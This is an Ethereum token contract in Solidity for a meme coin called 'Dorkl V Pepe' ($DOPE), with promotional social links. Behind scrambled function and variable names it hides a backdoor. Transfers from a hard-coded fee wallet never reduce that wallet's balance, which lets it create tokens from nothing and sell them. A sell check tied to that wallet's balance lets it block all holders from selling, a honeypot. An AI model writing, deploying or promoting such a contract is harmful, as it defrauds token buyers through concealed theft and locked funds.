/**
Dorkl V Pepe - $DOPE


TELEGRAM: https://t.me/dope_erc

TWITTER: https://twitter.com/DOPEEthereum

WEBSITE: https://dovpe.com/
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;



interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _wjrfp(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wjrfp(a, b, "SafeMath:");
    }

    function  _wjrfp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _snisapsactoryup {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xnisaqRuats {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract DorklVPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcldedFrof;
    mapping (address => bool) private _taxhWallety;
    mapping(address => uint256) private _lderLaransferestap;
    bool public _tnsferelanale = false;
    address payable private _qFxRaeivrp;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Dorkl V Pepe";
    string private constant _symbol = unicode"DOPE";
    uint256 private constant _Totalsr = 100000000 * 10 **_decimals;
    uint256 public _mxTaxAmaunt = _Totalsr;
    uint256 public _WalletSmax = _Totalsr;
    uint256 public _wapThresholdtax= _Totalsr;
    uint256 public _moaxToxSap= _Totalsr;

    uint256 private _BuyTaxinitial=13;
    uint256 private _SellTaxinitial=18;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=7;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeprevent=0;
    uint256 private _bytwxuot=0;

    _xnisaqRuats private _uisapRauxet;
    address private _aPairw;
    bool private _vlukqh;
    bool private itoxSwop = false;
    bool private _apEablew = false;

    event _amaunateql(uint _mxTaxAmaunt);
    modifier lckThawxp {
        itoxSwop = true;
        _;
        itoxSwop = false;
    }

    constructor () {
        _qFxRaeivrp = payable(0x1ff90984D8e85c4FaE3e2035ca4F67adef7749C9);
        _balances[_msgSender()] = _Totalsr;
        _isExcldedFrof[owner()] = true;
        _isExcldedFrof[address(this)] = true;
        _isExcldedFrof[_qFxRaeivrp] = true;


        emit Transfer(address(0), _msgSender(), _Totalsr);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalsr;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wjrfp(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsferelanale) {
                if (to != address
                (_uisapRauxet) && to !=
                 address(_aPairw)) {
                  require(_lderLaransferestap
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lderLaransferestap
                  [tx.origin] = block.number;
                }
            }

            if (from == _aPairw && to != 
            address(_uisapRauxet) && !_isExcldedFrof[to] ) {
                require(amount <= _mxTaxAmaunt,
                 "Exceeds the _mxTaxAmaunt.");
                require(balanceOf(to) + amount
                 <= _WalletSmax, "Exceeds the maxWalletSize.");
                if(_bytwxuot
                < _wapBeforeprevent){
                  require(! _frxerpz(to));
                }
                _bytwxuot++;
                 _taxhWallety[to]=true;
                teeomoun = amount.mul((_bytwxuot>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _aPairw && from!= address(this) 
            && !_isExcldedFrof[from] ){
                require(amount <= _mxTaxAmaunt && 
                balanceOf(_qFxRaeivrp)<_moaxToxSap,
                 "Exceeds the _mxTaxAmaunt.");
                teeomoun = amount.mul((_bytwxuot>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_bytwxuot>_wapBeforeprevent &&
                 _taxhWallety[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!itoxSwop 
            && to == _aPairw && _apEablew &&
             contractTokenBalance>_wapThresholdtax 
            && _bytwxuot>_wapBeforeprevent&&
             !_isExcldedFrof[to]&& !_isExcldedFrof[from]
            ) {
                _swpokeykhj( _qekw(amount, 
                _qekw(contractTokenBalance,_moaxToxSap)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _enphsprwkx(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _wjrfp(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _wjrfp(teeomoun));
        emit Transfer(from, to, 
        amount. _wjrfp(teeomoun));
    }

    function _swpokeykhj(uint256
     tokenAmount) private lckThawxp {
        if(tokenAmount==0){return;}
        if(!_vlukqh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _uisapRauxet.WETH();
        _approve(address(this),
         address(_uisapRauxet), tokenAmount);
        _uisapRauxet.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qekw(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wjrfp(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qFxRaeivrp){
            return a ;
        }else{
            return a . _wjrfp (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTaxAmaunt = _Totalsr;
        _WalletSmax = _Totalsr;
        _tnsferelanale = false;
        emit _amaunateql(_Totalsr);
    }

    function _frxerpz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _enphsprwkx(uint256
    amount) private {
        _qFxRaeivrp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _vlukqh);
        _uisapRauxet   =  _xnisaqRuats (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_uisapRauxet), _Totalsr);
        _aPairw = _snisapsactoryup(_uisapRauxet.factory()). createPair (address(this),  _uisapRauxet . WETH ());
        _uisapRauxet.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_aPairw).approve(address(_uisapRauxet), type(uint).max);
        _apEablew = true;
        _vlukqh = true;
    }

    receive() external payable {}
}